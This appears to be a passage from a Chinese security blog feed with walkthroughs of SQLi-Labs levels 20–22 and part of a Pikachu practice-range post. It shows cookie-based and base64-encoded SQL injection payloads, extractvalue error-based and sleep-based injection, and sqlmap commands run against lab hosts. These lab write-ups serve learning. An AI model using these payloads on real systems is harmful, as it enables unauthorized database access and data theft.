&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = admin and expires: Sun 22 Nov 2020 - 11:22:50Your Login name:adminYour Password:1Your ID:8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那就 cookie 注入呗，bp 抓包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /Less-20/index.php HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-20/index.phpDNT: 1Connection: closeCookie: uname=adminUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;cookie 后单引号开战&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27;admin&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面的 sql 橘子拿到了，就开始常规姿势闭合，拿 database ()&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; and extractvalue(1,concat(&amp;#x27;~&amp;#x27;,database())) # &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出，拿到库名 security：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Issue with your mysql: XPATH syntax error: &amp;#x27;~security&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿字段内容同 less-11&lt;/p&gt;
&lt;h2 id=&#34;总结-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-20&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;报错注入真好用&lt;/p&gt;
&lt;p&gt;前面写了题，后面就越写越快了，开心&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-21&#34;&gt;#&lt;/a&gt; Less-21&lt;/h1&gt;
&lt;p&gt;date：2020-11-22 10:29:18&lt;/p&gt;
&lt;h2 id=&#34;过程-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-21&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-21&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;bp 抓包右键 copy to file 生成 21.txt&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后续同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-21&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;老规矩，输入 17 关重置后的账户密码 admin/1&lt;/p&gt;
&lt;p&gt;题目还是 cookie 注入：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 11:29:55Your Login name:adminYour Password:1Your ID:8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看标题是复杂版的…&lt;/p&gt;
&lt;p&gt;啊这，先试试引号，竟然不报错了！&lt;/p&gt;
&lt;p&gt;有趣&lt;/p&gt;
&lt;p&gt;看了下题目 uname 那里发生了改变，抓包发现 uname 是 YWRtaW4，改成 admin 试试&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &amp;#x27;=&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;说是编码集的问题，好叭我去百度&lt;a href=&#34;https://www.cnblogs.com/escwq/p/12264076.html&#34;&gt;闯关秘籍了&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对 cookie 的值进行了 base64 的处理，其他和 20 关一样&lt;/p&gt;
&lt;p&gt;也就是说在注入的时候需要把注入语句搞一下编码，打开 hackbar，打开 base64 编码，输入 admin’&lt;/p&gt;
&lt;p&gt;bp 发包设置 cookie&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=YWRtaW4n&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27;admin&amp;#x27;&amp;#x27;) LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到后面的句子，开始闭合注入，不知为何我转义后的报错注入代码放进 payload 没有反应，换一个加密工具就好了&lt;/p&gt;
&lt;p&gt;用报错注入拿数据&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;明文：admin&amp;#x27;) and extractvalue(1,concat(&amp;#x27;,&amp;#x27;,database())) # base64转义：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=设置cookie：Cookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;YOUR COOKIE : uname = YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA= and expires: Sun 22 Nov 2020 - 12:30:51&amp;lt;br&amp;gt;&amp;lt;/font&amp;gt;Issue with your mysql: XPATH syntax error: &amp;#x27;,security&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到数据库名，拿别的数据同 less-11&lt;/p&gt;
&lt;h2 id=&#34;总结-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-21&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/makenothing/article/details/81155960&#34;&gt;base64 使用场景及原理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;base64 最早就是用来邮件传输协议中的，原因是邮件传输协议只支持 ascii 字符传递，因此如果要传输二进制文件，如：图片、视频是无法实现的。&lt;/p&gt;
&lt;p&gt;因此 base64 就可以用来将二进制文件内容编码为只包含 ascii 字符的内容。&lt;/p&gt;
&lt;p&gt;我们知道在计算机中任何数据都是按 ascii 码存储的，而 ascii 码的 128～255 之间的值是不可见字符。而在网络上交换数据时，比如说从 A 地传到 B 地，往往要经过多个路由设备，由于不同的设备对字符的处理方式有一些不同，这样那些不可见字符就有可能被处理错误，这是不利于传输的。所以就先把数据先做一个 Base64 编码，统统变成可见字符，这样出错的可能性就大降低了。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-22&#34;&gt;#&lt;/a&gt; Less-22&lt;/h1&gt;
&lt;p&gt;date：2020-11-22 11:35:53&lt;/p&gt;
&lt;h2 id=&#34;过程-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-22&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-22&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;bp 抓包右键 copy to file 生成 22.txt&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后续同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-22&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;还是用 admin\1 登录，显示 cookie，那就还是 cookie 注入&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 12:37:26Your Login name:adminYour Password:1Your ID:8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看见 uname = YWRtaW4= ，那就应该还是用 base64 加密&lt;/p&gt;
&lt;p&gt;使用上一题的 payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;明文：admin&amp;#x27;) and extractvalue(1,concat(&amp;#x27;,&amp;#x27;,database())) # base64：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现没有报错显示，那么说明没有闭合成功，看标题是双引号闭合，那就改一下引号&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;明文：admin&amp;quot;) and extractvalue(1,concat(&amp;#x27;,&amp;#x27;,database())) # base64：YWRtaW4iKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;) and extractvalue(1,concat(&amp;#x27;,&amp;#x27;,database())) # &amp;quot; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哪到后面的 sql 语句，发现只需要闭合一个双引号，不需要），开干&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;明文：admin&amp;quot; and extractvalue(1,concat(&amp;#x27;,&amp;#x27;,database())) # base64：YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJywnLGRhdGFiYXNlKCkpKSAjIA==&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Issue with your mysql: XPATH syntax error: &amp;#x27;,security&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到数据库名，拿别的数据同 less-11&lt;/p&gt;
&lt;h2 id=&#34;总结-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-22&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;我发现 sqlmap 跑得有一点慢&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2020/10/30/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/</guid>
            <title>pikachu大冒险鸭</title>
            <link>http://example.com/2020/10/30/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/</link>
            <category>pikachu,web靶场</category>
            <pubDate>Fri, 30 Oct 2020 11:46:05 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
&lt;h2 id=&#34;搜索型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#搜索型注入&#34;&gt;#&lt;/a&gt; 搜索型注入&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-sql-001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;爆出数据库，确定了是三个字段输出&lt;img src=&#34;pikachu-sql-002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;xx型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xx型注入&#34;&gt;#&lt;/a&gt; xx 型注入&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我是想看报错信息的，三个单引号，结果莫名其妙就过了&lt;/p&gt;
&lt;p&gt;pyload：&lt;a href=&#34;http://www.pikachu.com/vul/sqli/sqli_x.php&#34;&gt;http://www.pikachu.com/vul/sqli/sqli_x.php&lt;/a&gt;&lt;br&gt;
?name=’’’) union select 1,database() %23&lt;br&gt;
&amp;amp;submit=%E6%9F%A5%E8%AF%A2&lt;/p&gt;
&lt;p&gt;哦，刚刚试了下，一个单引号就过了，之所以➕），是因为看报错信息的时候发现最后面有一个），所以想到小括号可能没有闭合&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-sql-003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;insertupdate注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#insertupdate注入&#34;&gt;#&lt;/a&gt; &amp;quot;insert/update&amp;quot; 注入&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;试报错，看具体语句&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-sql-004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27;,md5(&amp;#x27;a&amp;#x27;),&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;密码随便输，构造用户名 payload，注意时间注入的时候要括号起来，不然会报错：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;admin&amp;#x27;,&amp;#x27;admin&amp;#x27;,&amp;#x27;&amp;#x27;,(select sleep(10)),&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;) # &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实际上差不多数据库执行的语句：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into a(1,2,3,4,5,6) values(&amp;#x27; admin&amp;#x27;,&amp;#x27;admin&amp;#x27;,&amp;#x27;&amp;#x27;,(select sleep(10)),&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;) # &amp;#x27;,&amp;#x27;md5(admin)&amp;#x27;,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;  );&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注册成功，最后也不晓得这个注入有劳资用？而且登陆的时候检查密码也是 md5 加密一下的…&lt;/p&gt;
&lt;p&gt;然后登陆的时候，源代码还报错惹&lt;/p&gt;
&lt;p&gt;时隔几天，我突然想起来，既然可以注入那么就能时间盲注进行判断…&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;delete注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#delete注入&#34;&gt;#&lt;/a&gt; delete 注入&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;发现删除的时候是 get 请求，参数 id，直接 sqlmap 泡一泡：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span 